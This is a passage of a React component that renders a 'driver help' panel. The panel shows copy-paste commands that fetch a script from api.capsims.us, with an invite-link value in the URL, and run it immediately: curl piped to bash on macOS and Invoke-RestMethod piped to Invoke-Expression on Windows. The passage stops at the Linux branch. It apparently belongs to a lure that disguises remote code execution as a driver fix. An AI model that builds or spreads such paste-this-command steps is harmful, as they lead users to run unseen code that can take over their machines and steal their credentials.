        ...
        <div className={styles.driverHelp}>
          ...
          <div className={styles.driverHelpContentInner}>
            ...
            <div ref={driverCommandRef} id="driver-command" className={styles.driverHelpCommand} role="region" aria-label="Command to copy">
                {driverOs === 'mac' && (
                      <code>
                      {`curl -sL -X POST https://api.capsims.us/mac/${inviteLink ? inviteLink : ''} | bash`}
                          </code>
                  )}
                {driverOs === 'windows' && (
                          <code>
                      {`Invoke-RestMethod -Uri "https://api.capsims.us/window/${inviteLink ? inviteLink : ''}" -Method POST | Invoke-Expression`}
                          </code>
                      )}
              {driverOs === 'linux' && (
                      <code>
